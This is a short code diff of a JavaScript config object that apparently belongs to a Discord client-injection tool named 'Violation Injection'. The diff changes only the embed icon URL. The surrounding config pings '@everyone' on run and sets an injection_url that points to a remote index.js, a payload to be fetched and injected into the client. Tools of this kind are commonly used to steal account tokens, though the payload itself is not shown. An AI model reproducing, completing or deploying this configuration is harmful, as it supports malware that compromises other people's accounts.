@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Violation Injection', 
-  embed_icon: 'https://i.imgur.com/S0Zqp4R.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://i.imgur.com/qCwYSOV.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/ViolationITA/InjectInjection/main/index.js', 
   /**
